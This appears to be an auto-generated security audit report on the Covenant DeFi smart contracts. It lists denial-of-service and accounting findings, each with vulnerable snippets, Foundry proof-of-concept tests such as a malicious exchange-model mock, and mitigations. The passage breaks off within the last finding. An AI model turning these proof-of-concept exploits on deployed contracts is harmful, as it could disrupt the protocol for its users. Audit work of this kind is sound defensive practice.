# 2025 10 covenant - Findings Report
## Commit hash: d5ebe4461564b46cacf8a90cf11add29470ef001

##Findings by Pattern


 **Derived From** : Swap path without BASE out can underflow baseSupply when only fees are charged

[L-1]. DoS: Covenant.swap deducts protocolFees without bound on non-BASE swaps, underflowing baseSupply and reverting
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 7
Privilege: Permissionless
Poc Test Status: ErrorRunningTests




 **Derived From** : No 2-cycle in resolution graph: if resolvedVaults[v] != address(0) and resolvedVaults[resolvedVaults[v]] != address(0) then resolvedVaults[resolvedVaults[v]] != v

[L-2]. Infinite recursion DoS in CovenantCurator.resolveOracle from 2-node ERC4626 vault cycle
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless
Poc Test Status: ErrorRunningTests




 **Derived From** : Let P = IPyth(pyth).getPriceUnsafe(feedId); If previewGetQuote() returns, then block.timestamp - P.publishTime <= maxStaleness

[M-3]. Preview staleness bound mismatch in PythOracle.previewGetQuote returns quotes that live path would revert on
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless
Poc Test Status: FailingTests




 **Derived From** : set == true implies resolvedVaults[vault] == IERC4626(vault).asset() && resolvedVaults[vault] != vault

[L-4]. Infinite recursion in resolveOracle via self/cyclic resolvedVaults mapping DoS bricking all price queries for ERC4626 bases
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless
Poc Test Status: ErrorRunningTests




 **Derived From** : Redeem omits fee bound: amountOut + protocolFees not checked against baseSupply

[M-5]. Covenant.redeem can underflow baseSupply because protocolFees is not included in redeem bounds, causing DoS and preview/redeem mismatch
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 7
Privilege: Permissionless
Poc Test Status: FailingTests




 **Derived From** : Let S := marketState[marketId].baseSupply + marketState[marketId].protocolFeeGrowth and B := IERC20(redeemParams.marketParams.baseToken).balanceOf(address(this)); Then (S_post - S_pre) == (B_post - B_pre)

[M-6]. Redeeming to Covenant itself black-holes funds and breaks ΔS == ΔB balance invariant
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless
Poc Test Status: FailingTests



### Number of Findings
- C: 0
- H: 0
- M: 3
- L: 3
- I: 0

##Findings by Pattern


 **Derived From** : Swap path without BASE out can underflow baseSupply when only fees are charged

## [L-1]. DoS: Covenant.swap deducts protocolFees without bound on non-BASE swaps, underflowing baseSupply and reverting

## Derived From Pattern/Invariant
Swap path without BASE out can underflow baseSupply when only fees are charged

## Exploit Type
AccountingInvariantViolation

## Location
Covenant.swap

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 7
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In Covenant.swap, when neither assetIn nor assetOut is BASE, the contract unconditionally decrements baseSupply by protocolFees without verifying baseSupply >= protocolFees. Unlike the BASE-out path, there is no fee bound in ValidationLogic.checkSwapOutputs for this branch. A malicious/buggy ILiquidExchangeModel (LEX) can return protocolFees > baseSupply, causing an underflow revert and making aToken<->zToken swaps unavailable. Vulnerable snippet:

else if (protocolFees > 0) {
    // No guard that protocolFees <= localBaseSupply
    ms.baseSupply = localBaseSupply - protocolFees; // underflows if fees > supply
}

This breaks the accounting invariant that baseSupply cannot be negative and allows a permissionless DoS on the non-BASE swap route.

## Impact
If the enabled LEX returns protocolFees greater than the current baseSupply for a non-BASE↔non-BASE swap, Covenant.swap will revert due to arithmetic underflow when updating baseSupply. This does not result in any loss of funds or persistent protocol lock; it only causes the current transaction to fail (and would continue to fail as long as the LEX reports impossible fees). Given LEX addresses are owner-whitelisted, this falls under input validation/integration hardening rather than a direct protocol DoS.

## Command to Run Test


## Proof of Concept
1) Attacker creates or targets a market where baseSupply is small (can be 0 at creation).
2) Calls swap with assetIn=DEBT and assetOut=LEVERAGE (or vice versa), exactIn, amountSpecified > 0.
3) A buggy/malicious LEX returns protocolFees > baseSupply (e.g., baseSupply+1). Because Covenant does not bound protocolFees for non-BASE swaps, it subtracts and underflows baseSupply, reverting the transaction. This makes the aToken<->zToken route unusable.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "forge-std/StdError.sol";
import {Covenant} from "src/Covenant.sol";
import {ILiquidExchangeModel} from "src/interfaces/ILiquidExchangeModel.sol";
import {ICovenant, MarketId, MarketParams, SwapParams, TokenPrices, SynthTokens, AssetType} from "src/interfaces/ICovenant.sol";

contract MockERC20 {
    string public name; string public symbol; uint8 public decimals = 18; uint256 public totalSupply;
    mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance;
    constructor(string memory n, string memory s){name=n;symbol=s;}
    function approve(address s, uint256 a) external returns (bool){allowance[msg.sender][s]=a; return true;}
    function transfer(address to, uint256 a) external returns (bool){balanceOf[msg.sender]-=a; balanceOf[to]+=a; return true;}
    function transferFrom(address f,address t,uint256 a) external returns (bool){uint256 al=allowance[f][msg.sender]; if(al!=type(uint256).max) allowance[f][msg.sender]=al-a; balanceOf[f]-=a; balanceOf[t]+=a; return true;}
    function mint(address to, uint256 a) external {balanceOf[to]+=a; totalSupply+=a;}
}

contract MaliciousLEX is ILiquidExchangeModel {
    function getProtocolFee(MarketId) external view returns (uint32) { return 0; }
    function getSynthTokens(MarketId) external view returns (SynthTokens memory) { return SynthTokens(address(0), address(0)); }
    function name() external pure returns (string memory) { return "MaliciousLEX"; }
    function setMarketProtocolFee(MarketId, uint32) external {}
    function initMarket(MarketId, MarketParams calldata, uint32, bytes memory) external pure returns (SynthTokens memory s, bytes memory d) { return (s, d); }
    function mint(MintParams calldata, address, uint256) external payable returns (uint256, uint256, uint128, TokenPrices memory) { return (0,0,0, TokenPrices(0,0,0)); }
    function redeem(RedeemParams calldata, address, uint256) external payable returns (uint256, uint128, TokenPrices memory) { return (0,0, TokenPrices(0,0,0)); }
    function swap(SwapParams calldata, address, uint256 baseSupply) external payable returns (uint256 amt, uint128 fees, TokenPrices memory) {
        return (1, uint128(baseSupply + 1), TokenPrices(0,0,0)); // force protocolFees > baseSupply
    }
    function updateState(MarketId, MarketParams calldata, uint256, bytes calldata) external payable returns (uint128) { return 0; }
    function quoteMint(MintParams calldata, address, uint256) external pure returns (uint256, uint256, uint128, uint128, TokenPrices memory) { return (0,0,0,0, TokenPrices(0,0,0)); }
    function quoteRedeem(RedeemParams calldata, address, uint256) external pure returns (uint256, uint128, uint128, TokenPrices memory) { return (0,0,0, TokenPrices(0,0,0)); }
    function quoteSwap(SwapParams calldata, address, uint256) external pure returns (uint256, uint128, uint128, TokenPrices memory) { return (0,0,0, TokenPrices(0,0,0)); }
}

contract SwapFeeUnderflowTest is Test {
    Covenant cov;
    MaliciousLEX lex;
    MockERC20 base;
    MockERC20 quote;

    function setUp() public {
        cov = new Covenant(address(this));
        lex = new MaliciousLEX();
        base = new MockERC20("BASE","B");
        quote = new MockERC20("QUOTE","Q");

        cov.setEnabledLEX(address(lex), true);
        cov.setEnabledCurator(address(1), true); // dummy curator
    }

    function test_NonBaseSwap_UnderflowsBaseSupply_Reverts() public {
        MarketParams memory mp = MarketParams(address(base), address(quote), address(1), address(lex));
        MarketId id = cov.createMarket(mp, ""); // baseSupply == 0

        SwapParams memory sp;
        sp.marketId = id;
        sp.marketParams = mp;
        sp.assetIn = AssetType.DEBT;        // not BASE
        sp.assetOut = AssetType.LEVERAGE;   // not BASE
        sp.to = address(this);
        sp.amountSpecified = 1;
        sp.amountLimit = 0;
        sp.isExactIn = true;
        sp.data = "";
        sp.msgValue = 0;

        vm.expectRevert(stdError.arithmeticError);
        cov.swap(sp); // reverts due to baseSupply - protocolFees underflow

        // Confirm state unchanged after revert
        ICovenant.MarketState memory st = cov.getMarketState(id);
        assertEq(st.baseSupply, 0, "baseSupply unchanged");
    }
}


## Suggested Mitigation
Add explicit bounds checks so Covenant reverts with a controlled, descriptive error instead of an arithmetic underflow when fees exceed available baseSupply:
- In ValidationLogic.checkSwapOutputs(): when neither assetIn nor assetOut is BASE, require(protocolFees <= baseSupply) and revert with E_InsufficientAmount on violation. This aligns behavior with the BASE-out branch, which already considers fees in its bound.
- In Covenant.swap(): before executing the non-BASE branch that decrements ms.baseSupply by protocolFees, require(protocolFees <= localBaseSupply) with a descriptive error (e.g., E_InsufficientAmount). This provides defense-in-depth and ensures consistent revert reasons.
- In Covenant.redeem(): ensure amountOut + protocolFees <= baseSupply (ValidationLogic.checkRedeemOutputs should be extended accordingly); otherwise revert with E_InsufficientAmount. This prevents the same underflow pattern when redeeming.
- In _updateState(): if protocolFees > 0, require(protocolFees <= marketState[marketId].baseSupply) before subtracting, reverting with E_InsufficientAmount on violation.
These changes do not change economic behavior (transactions with impossible fees should revert) but eliminate arithmetic underflows and standardize revert reasons across code paths.





 **Derived From** : No 2-cycle in resolution graph: if resolvedVaults[v] != address(0) and resolvedVaults[resolvedVaults[v]] != address(0) then resolvedVaults[resolvedVaults[v]] != v

## [L-2]. Infinite recursion DoS in CovenantCurator.resolveOracle from 2-node ERC4626 vault cycle

## Derived From Pattern/Invariant
No 2-cycle in resolution graph: if resolvedVaults[v] != address(0) and resolvedVaults[resolvedVaults[v]] != address(0) then resolvedVaults[resolvedVaults[v]] != v

## Exploit Type
AccountingInvariantViolation

## Location
CovenantCurator.resolveOracle

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
resolveOracle unwraps ERC4626 vaults by recursively substituting base with resolvedVaults[base] and calling convertToAssets(). If two resolved vaults A and B reference each other (resolvedVaults[A]=B and resolvedVaults[B]=A), the function alternates A↔B indefinitely, exhausting gas/stack and reverting for all quotes involving either vault. Vulnerable snippet:

address baseAsset = resolvedVaults[base];
if (baseAsset != address(0)) {
    inAmount = IERC4626(base).convertToAssets(inAmount);
    return resolveOracle(inAmount, baseAsset, quote); // no cycle guard
}

## Impact
Functional DoS of pricing routes for any base/quote that touches a cyclicly resolved ERC4626 chain. However, this state can only be created by the owner via govSetResolvedVault; once present, any user can trigger the revert (permissionless to exercise, but admin-caused). No loss of user funds; availability of price queries and updates is impacted until the misconfiguration is removed.

## Command to Run Test


## Proof of Concept
1) Governance registers two vaults v1 and v2 as resolvedVaults.
2) v1.asset() returns address(v2) and v2.asset() returns address(v1).
3) Any user calls router.getQuote(x, v1, quote). resolveOracle keeps substituting v1→v2→v1→… with no base case, causing out-of-gas. This is permissionless DoS once misconfiguration exists.
4) Same DoS affects getQuotes/previewGetQuote/previewGetQuotes/updatePriceFeeds/getUpdateFee.

## Proof of Code
pragma solidity ^0.8.30;

import {Test} from "forge-std/Test.sol";
import {CovenantCurator} from "src/curators/CovenantCurator.sol";

contract MockVault {
    address public assetAddr;
    function setAsset(address a) external { assetAddr = a; }
    function asset() external view returns (address) { return assetAddr; }
    function convertToAssets(uint256 inAmount) external view returns (uint256) { return inAmount; }
}

contract ResolveOracleCycleTest is Test {
    function test_DoS_on_TwoNodeVaultCycle() public {
        // Deployer is owner
        CovenantCurator router = new CovenantCurator(address(this));
        // Two mock ERC4626-like vaults pointing to each other as underlying asset
        MockVault v1 = new MockVault();
        MockVault v2 = new MockVault();
        v1.setAsset(address(v2));
        v2.setAsset(address(v1));

        // Owner configures both as resolved vaults (reads asset() during config)
        router.govSetResolvedVault(address(v1), true);
        router.govSetResolvedVault(address(v2), true);

        // Any quote touching v1 or v2 now infinitely recurses during resolveOracle
        bytes memory data = abi.encodeWithSelector(
            CovenantCurator.getQuote.selector,
            uint256(1e18),
            address(v1),
            address(0xBEEF)
        );

        // Use a limited gas call so the OOG bubbles back as ok=false quickly and deterministically
        (bool ok, ) = address(router).call{gas: 120000}(data);
        assertEq(ok, false, "getQuote must fail due to infinite recursion from 2-node cycle");
    }
}


## Suggested Mitigation
Add explicit cycle/progress guards and validate at configuration time: 1) In govSetResolvedVault, reject self-loops and bounded-cycle creation. Read the new vault's asset, then follow resolvedVaults forward for a small, fixed number of steps (e.g., 8–16). If any visited address equals the vault being added (or is already in the visited set), revert. 2) In resolveOracle, replace unbounded recursion with an iterative loop and a max depth (e.g., MAX_RESOLVE_STEPS = 16). Track visited bases in a small fixed-size array and revert with a specific error on loop detection or when the step limit is exceeded. Optionally, on loop detection fall back to the fallbackOracle if set; otherwise revert with a dedicated error (e.g., PriceOracle_VaultResolutionLoop). These checks fully eliminate infinite recursion and make misconfiguration failures explicit and recoverable.





 **Derived From** : Let P = IPyth(pyth).getPriceUnsafe(feedId); If previewGetQuote() returns, then block.timestamp - P.publishTime <= maxStaleness

## [M-3]. Preview staleness bound mismatch in PythOracle.previewGetQuote returns quotes that live path would revert on

## Derived From Pattern/Invariant
Let P = IPyth(pyth).getPriceUnsafe(feedId); If previewGetQuote() returns, then block.timestamp - P.publishTime <= maxStaleness

## Exploit Type
TimestampDependentLogic

## Location
PythOracle.previewGetQuote

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: FailingTests
## Minimim Privilege Required:Permissionless


## Description
The preview path uses a fixed MAX_STALENESS_UPPER_BOUND (15 minutes) in _previewFetchPriceStruct instead of the configured per-oracle maxStaleness. As a result, when maxStaleness < 15 minutes and the Pyth publishTime is stale within (maxStaleness, 15 minutes], previewGetQuote()/previewGetQuotes return amounts while the live path (_getQuote via BaseAdapter) reverts with Errors.PriceOracle_InvalidAnswer(). This temporal inconsistency can cause integrators/users to accept seemingly executable quotes that systematically fail on-chain, leading to execution-time DoS and mis-estimated slippage/fees. Vulnerable snippet:

function _previewFetchPriceStruct() internal view returns (PythStructs.Price memory) {
    PythStructs.Price memory p = IPyth(pyth).getPriceUnsafe(feedId);
    if (p.publishTime < block.timestamp) {
        uint256 staleness = block.timestamp - p.publishTime;
        if (staleness > MAX_STALENESS_UPPER_BOUND) revert Errors.PriceOracle_InvalidAnswer(); // uses 15m cap, not maxStaleness
    } else {
        uint256 aheadness = p.publishTime - block.timestamp;
        if (aheadness > MAX_AHEADNESS) revert Errors.PriceOracle_InvalidAnswer();
    }
    ...
}

## Impact
Functional DoS and user-facing mispricing: previews show executable quotes while state-changing flows revert due to stricter staleness, causing failed transactions and wasted gas; integrators relying on preview for slippage/fee estimation may under-protect or over-reject trades.

## Command to Run Test
forge test --match-path test/poc/M-Preview-staleness-bound-mismatch-in-Pyth.t.sol -vvv

## Proof of Concept
1) Deploy PythOracle with maxStaleness = 60 seconds.
2) Mock Pyth returns a price with publishTime = block.timestamp - 5 minutes (staleness 300s), which is > maxStaleness (60s) but <= MAX_STALENESS_UPPER_BOUND (900s). Use expo within bounds (e.g., 0) and small conf to pass all other checks.
3) Call previewGetQuote: succeeds and returns a non-zero amount because preview uses the 15-minute bound.
4) Call live quote (_getQuote via a harness): reverts with PriceOracle_InvalidAnswer due to staleness > maxStaleness.
This demonstrates the temporal inconsistency: preview returns a quote that the executable path would reject.

## Proof of Code
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.30;

// Test setup dependencies
import "forge-std/Test.sol";
import {CovenantCurator} from "../../src/curators/CovenantCurator.sol";
import {StubPriceOracle} from "../mocks/StubPriceOracle.sol";
import {MockChainlinkAggregator} from "./mocks/MockChainlinkAggregator.sol";
import {ChainlinkOracle} from "../../src/curators/oracles/chainlink/ChainlinkOracle.sol";
import {MockPyth} from "./mocks/MockPyth.sol";
import {PythOracle} from "../../src/curators/oracles/pyth/PythOracle.sol";

// Several project dependencies that might be useful in PoCs
import {SynthToken} from "../../src/synths/SynthToken.sol";
import {Covenant, MarketId, MarketParams, MarketState, SynthTokens} from "../../src/Covenant.sol";
import {LatentSwapLEX} from "../../src/lex/latentSwap/LatentSwapLEX.sol";
import {LSErrors} from "../../src/lex/latentSwap/libraries/LSErrors.sol";
import {FixedPoint} from "../../src/lex/latentswap/libraries/FixedPoint.sol";
import {DebtMath} from "../../src/lex/latentswap/libraries/DebtMath.sol";
import {ICovenant, IERC20, AssetType, SwapParams, RedeemParams, MintParams} from "../../src/interfaces/ICovenant.sol";
import {ISynthToken} from "../../src/interfaces/ISynthToken.sol";
import {IPriceOracle} from "../../src/interfaces/IPriceOracle.sol";
import {ILiquidExchangeModel} from "../../src/interfaces/ILiquidExchangeModel.sol";
import {ILatentSwapLEX, LexState} from "../../src/lex/latentswap/interfaces/ILatentSwapLEX.sol";
import {MockOracle} from "../mocks/MockOracle.sol";
import {MockERC20} from "../mocks/MockERC20.sol";
import {WadRayMath} from "@aave/libraries/math/WadRayMath.sol";
import {IERC20Metadata} from "@openzeppelin/token/ERC20/extensions/IERC20Metadata.sol";
import {UtilsLib} from "../../src/libraries/Utils.sol";
import {TestMath} from "../utils/TestMath.sol";
import {Events} from "../../src/libraries/Events.sol";
import {Errors} from "../../src/libraries/Errors.sol";
import {LatentSwapLib} from "../../src/periphery/libraries/LatentSwapLib.sol";
import {PercentageMath} from "@aave/libraries/math/PercentageMath.sol";
import {IERC4626} from "forge-std/interfaces/IERC4626.sol";
import {StubERC4626} from "../mocks/StubERC4626.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {PythStructs} from "@pyth/PythStructs.sol";

contract CovenantTest is Test {
    using WadRayMath for uint256;

    // LatentSwapLEX init pricing constants
    uint160 internal constant P_MAX = uint160((1095445 * FixedPoint.Q96) / 1000000); //uint160(Math.sqrt((FixedPoint.Q192 * 12) / 10)); // Edge price of 1.2
    uint160 internal constant P_MIN = uint160(FixedPoint.Q192 / P_MAX);
    uint32 internal constant DURATION = 30 * 24 * 60 * 60;
    uint8 internal constant SWAP_FEE = 0;
    int64 internal constant LN_RATE_BIAS = 5012540000000000; // WAD

    address private _mockOracle;
    address private _mockBaseAsset;
    address private _mockQuoteAsset;
    uint160 private P_LIM_H = LatentSwapLib.getSqrtPriceFromLTVX96(P_MIN, P_MAX, 9500);
    uint160 private P_LIM_MAX = LatentSwapLib.getSqrtPriceFromLTVX96(P_MIN, P_MAX, 9999);

    // PoC Contract Deployments
    Covenant public covenant;
    LatentSwapLEX public lex;
    CovenantCurator public covenantCurator;
    StubPriceOracle public covenantCuratorOracle;
    MarketId internal _marketId;
    MockChainlinkAggregator public chainlinkAggregator;
    ChainlinkOracle public chainlinkOracle;
    MockPyth public pyth;
    PythOracle public pythOracle;

    ////////////////////////////////////////////////////////////////////////////

    function setUp() public {
        // Deploy mock Oracle
        _mockOracle = address(new MockOracle(address(this)));

        // Deploy mock Base Asset w/ pre-mint
        _mockBaseAsset = address(new MockERC20(address(this), "MockBaseAsset", "MBA", 18));
        MockERC20(_mockBaseAsset).mint(address(this), 100e18);

        // Deploy mock Quote Asset
        _mockQuoteAsset = address(new MockERC20(address(this), "MockQaseAsset", "MQA", 18));

        // Deploy Covenant
        covenant = new Covenant(address(this));

        // Deploy LEX implementation
        lex = new LatentSwapLEX(
            address(this),
            address(covenant),
            P_MAX,
            P_MIN,
            P_LIM_H,
            P_LIM_MAX,
            LN_RATE_BIAS,
            DURATION,
            SWAP_FEE
        );

        // Connect LEX w/ Covenant
        covenant.setEnabledLEX(address(lex), true);

        // Connect mock oracle w/ Covenant
        covenant.setEnabledCurator(_mockOracle, true);

        // Create a mock market
        MarketParams memory marketParams = MarketParams({
            baseToken: _mockBaseAsset,
            quoteToken: _mockQuoteAsset,
            curator: _mockOracle,
            lex: address(lex)
        });
        _marketId = covenant.createMarket(marketParams, hex"");

        // Deploy the Covenant Curator (Oracle Router)
        covenantCurator = new CovenantCurator(address(this));

        // Deploy a *stub* oracle for the Covenant Curator
        covenantCuratorOracle = new StubPriceOracle();

        // Link *stub* oracle with mock base and quote assets
        covenantCurator.govSetConfig(_mockBaseAsset, _mockQuoteAsset, address(covenantCuratorOracle));

        // Deploy mock Chainlink Aggregator
        chainlinkAggregator = new MockChainlinkAggregator(8);

        // Deploy Chainlink Oracle
        chainlinkOracle = new ChainlinkOracle(_mockBaseAsset, _mockQuoteAsset, address(chainlinkAggregator), 1 hours);

        // Deploy mock Pyth
        pyth = new MockPyth();

        // Deploy Pyth Oracle with maxStaleness = 60 seconds
        pythOracle = new PythOracle(
            address(pyth),
            _mockBaseAsset,
            _mockQuoteAsset,
            bytes32(uint256(196)),
            60,  // maxStaleness = 60 seconds
            250
        );
    }

    function test_submissionValidity() public {
        // Step 1: Set up a stale price in Pyth that is:
        // - More than maxStaleness (60 seconds) old
        // - But less than MAX_STALENESS_UPPER_BOUND (15 minutes = 900 seconds) old
        // We'll use 5 minutes (300 seconds) staleness
        
        uint256 currentTime = 1000000; // Use a concrete timestamp to avoid underflow
        uint256 publishTime = currentTime - 300; // 5 minutes ago
        
        // Set the block timestamp to create the staleness condition
        vm.warp(currentTime);
        
        // Configure MockPyth with a price that has the desired staleness
        // Price: 2000 (with expo -8, so actual price is 2000 * 10^-8 = 0.00002)
        // Conf: 1 (low confidence to pass validation)
        // PublishTime: 5 minutes ago
        pyth.setPrice(bytes32(uint256(196)), int64(200000000000), 1000000, int32(-8), uint64(publishTime));
        
        // Step 2: Call previewGetQuote - should succeed because it uses MAX_STALENESS_UPPER_BOUND (900s)
        // Staleness of 300s < 900s, so preview should return a valid quote
        uint256 previewAmount;
        bool previewSucceeded = true;
        try pythOracle.previewGetQuote(1e18, _mockBaseAsset, _mockQuoteAsset) returns (uint256 amount) {
            previewAmount = amount;
        } catch {
            previewSucceeded = false;
        }
        
        // Assert that preview succeeded
        assertTrue(previewSucceeded, "Preview should succeed with 5-minute staleness");
        assertTrue(previewAmount > 0, "Preview should return non-zero amount");
        
        // Step 3: Try to call the live quote path (getQuote)
        // This should revert because staleness (300s) > maxStaleness (60s)
        bool liveReverted = false;
        try pythOracle.getQuote(1e18, _mockBaseAsset, _mockQuoteAsset) returns (uint256) {
            // Should not reach here
        } catch (bytes memory) {
            liveReverted = true;
        }
        
        // Assert that live path reverted
        assertTrue(liveReverted, "Live getQuote should revert with staleness > maxStaleness");
        
        // Step 4: Demonstrate the inconsistency
        // Preview returned a valid quote, but live execution would revert
        // This proves the temporal inconsistency described in the finding
        
        console.log("=== PoC Results ===");
        console.log("maxStaleness configured:", 60, "seconds");
        console.log("MAX_STALENESS_UPPER_BOUND:", 900, "seconds");
        console.log("Actual staleness:", 300, "seconds");
        console.log("Preview succeeded:", previewSucceeded);
        console.log("Preview amount:", previewAmount);
        console.log("Live getQuote reverted:", liveReverted);
        console.log("");
        console.log("VULNERABILITY DEMONSTRATED:");
        console.log("Preview shows executable quote, but live path reverts.");
        console.log("This causes DoS and mispricing for integrators.");
    }
}

## Suggested Mitigation
Make preview validations identical to live validations. Replace the staleness check in _previewFetchPriceStruct with the configured maxStaleness, or better, reuse the parent's _fetchPriceStruct to avoid drift: e.g., have previewGetQuote call the same _getQuote path, or have _previewFetchPriceStruct simply call _fetchPriceStruct. This guarantees previews cannot succeed when the live path would revert.





 **Derived From** : set == true implies resolvedVaults[vault] == IERC4626(vault).asset() && resolvedVaults[vault] != vault

## [L-4]. Infinite recursion in resolveOracle via self/cyclic resolvedVaults mapping DoS bricking all price queries for ERC4626 bases

## Derived From Pattern/Invariant
set == true implies resolvedVaults[vault] == IERC4626(vault).asset() && resolvedVaults[vault] != vault

## Exploit Type
StorageLayout

## Location
CovenantCurator.govSetResolvedVault

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
CovenantCurator.govSetResolvedVault writes resolvedVaults[vault] = IERC4626(vault).asset() without guarding against self-pointing or cycles. resolveOracle then recursively unwraps base via resolvedVaults[base] and IERC4626(base).convertToAssets(inAmount). If resolvedVaults[base] == base (e.g., a malicious/buggy ERC4626 whose asset() returns itself) or if two (or more) vaults are configured to point to each other, resolveOracle(base, quote) recurses without progress until gas/stack exhaustion, causing every price path that starts with base to revert. This bricks all getQuote/getQuotes/previewGetQuote/previewGetQuotes/updatePriceFeeds/getUpdateFee for markets referencing that base. Vulnerable snippet:

function govSetResolvedVault(address vault, bool set) external onlyOwner {
    address asset = set ? IERC4626(vault).asset() : address(0);
    resolvedVaults[vault] = asset;
    emit ResolvedVaultSet(vault, asset);
}

function resolveOracle(uint256 inAmount, address base, address quote) public view returns (...) {
    if (base == quote) return (inAmount, base, quote, address(0));
    address oracle = getConfiguredOracle(base, quote);
    if (oracle != address(0)) return (inAmount, base, quote, oracle);
    address baseAsset = resolvedVaults[base];
    if (baseAsset != address(0)) {
        inAmount = IERC4626(base).convertToAssets(inAmount);
        return resolveOracle(inAmount, baseAsset, quote); // recurses with no progress if baseAsset == base or in a cycle
    }
    oracle = fallbackOracle;
    if (oracle == address(0)) revert Errors.PriceOracle_NotSupported(base, quote);
    return (inAmount, base, quote, oracle);
}

## Impact
A misconfigured resolvedVault (self-reference or cycle) causes resolveOracle to recurse indefinitely, leading to out-of-gas and reverting all price queries/updates that start from that base. This functionally bricks affected markets until governance clears the misconfiguration. No funds are at risk. Because only the owner can write resolvedVaults, exploitation requires governance misconfiguration; thus this is a centralization/QA risk rather than a permissionless attack.

## Command to Run Test


## Proof of Concept
Steps to reproduce (requires owner misconfiguration):
1) Deploy an ERC4626 that returns asset() == address(this) (or two vaults v1, v2 with v1.asset() = v2 and v2.asset() = v1). Ensure convertToAssets(x) returns x.
2) Owner calls govSetResolvedVault(vault, true) (and for the 2-cycle, set both v1 and v2). This stores a self-reference or cycle in resolvedVaults.
3) Any user calling getQuote/previewGetQuote/getQuotes/previewGetQuotes/updatePriceFeeds/getUpdateFee with base=vault (or v1) and quote!=base triggers resolveOracle to recurse without progress, exhausting gas and reverting, effectively DoS-ing all calls for that base until governance fixes the mapping.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {CovenantCurator} from "src/curators/CovenantCurator.sol";

// Minimal ERC4626-shaped contracts exposing only the selectors used by CovenantCurator
contract ERC4626SelfAsset {
    function asset() external view returns (address) { return address(this); }
    function convertToAssets(uint256 a) external view returns (uint256) { return a; }
}

contract ERC4626Cycle {
    address public other;
    function setOther(address _other) external { other = _other; }
    function asset() external view returns (address) { return other; }
    function convertToAssets(uint256 a) external view returns (uint256) { return a; }
}

contract CuratorRecursionDoSTest is Test {
    CovenantCurator curator;

    function setUp() public {
        curator = new CovenantCurator(address(this)); // make this contract the governor
    }

    function test_OOG_onSelfPointingVault() public {
        ERC4626SelfAsset v = new ERC4626SelfAsset();
        // Owner misconfiguration: mark self-pointing vault as resolved
        curator.govSetResolvedVault(address(v), true);
        // Low-level call with bounded gas to avoid hanging the test runner
        (bool ok, ) = address(curator).call{gas: 1_000_000}(
            abi.encodeWithSelector(CovenantCurator.getQuote.selector, 1e18, address(v), address(0xBEEF))
        );
        assertFalse(ok, "call should fail due to unbounded recursion (self-reference)");
    }

    function test_OOG_onTwoVaultCycle() public {
        ERC4626Cycle v1 = new ERC4626Cycle();
        ERC4626Cycle v2 = new ERC4626Cycle();
        v1.setOther(address(v2));
        v2.setOther(address(v1));
        curator.govSetResolvedVault(address(v1), true);
        curator.govSetResolvedVault(address(v2), true);
        (bool ok, ) = address(curator).call{gas: 1_000_000}(
            abi.encodeWithSelector(CovenantCurator.getQuote.selector, 123, address(v1), address(0xCAFE))
        );
        assertFalse(ok, "call should fail due to recursion cycle (v1 <-> v2)");
    }
}


## Suggested Mitigation
Harden both configuration and resolution paths: (1) In govSetResolvedVault, reject self-references: require(!set || (asset != address(0) && asset != vault), PriceOracle_InvalidConfiguration). Optionally detect cycles before writing using a bounded walk or tortoise-hare (Floyd) cycle detection through resolvedVaults, reverting on detection. (2) In resolveOracle, replace recursion with an iterative loop and track visited addresses or enforce a small hop limit (e.g., max 8 unwraps). If a repeat is observed or the hop limit is exceeded, revert with a clear error instead of recursing unboundedly. (3) Operationally, only whitelist well-behaved ERC4626 vaults; at set-time, sanity-check that convertToAssets(1) succeeds and that asset() is not the vault itself.





 **Derived From** : Redeem omits fee bound: amountOut + protocolFees not checked against baseSupply

## [M-5]. Covenant.redeem can underflow baseSupply because protocolFees is not included in redeem bounds, causing DoS and preview/redeem mismatch

## Derived From Pattern/Invariant
Redeem omits fee bound: amountOut + protocolFees not checked against baseSupply

## Exploit Type
AccountingInvariantViolation

## Location
Covenant.redeem

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 7
### PoC Test Status: FailingTests
## Minimim Privilege Required:Permissionless


## Description
In Covenant.redeem, the contract updates baseSupply using baseSupply = localBaseSupply - amountOut - protocolFees, but ValidationLogic.checkRedeemOutputs only enforces amountOut <= baseSupply. Missing the protocolFees term allows ILiquidExchangeModel.redeem to return amountOut == baseSupply and protocolFees > 0, passing validation but underflowing the subtraction and reverting. This creates a denial of service for redemptions at the boundary and breaks the preview invariant: previewRedeem succeeds while redeem reverts. Vulnerable snippet:

// Validate redeem amounts (missing protocolFees bound)
ValidationLogic.checkRedeemOutputs(redeemParams, localBaseSupply, amountOut);
...
ms.baseSupply = localBaseSupply - amountOut - protocolFees; // underflows if amountOut + protocolFees > localBaseSupply

## Impact
Redemptions that return amountOut close to the entire baseSupply with any positive protocolFees will revert due to underflow in baseSupply update. This causes a functional DoS for those boundary inputs and a user-facing mismatch where previewRedeem succeeds but redeem reverts. No direct asset loss occurs, but protocol functionality and UX are impacted.

## Command to Run Test
forge test --match-path test/poc/M-Covenant-redeem-can-underflow-baseSupply.t.sol -vvv

## Proof of Concept
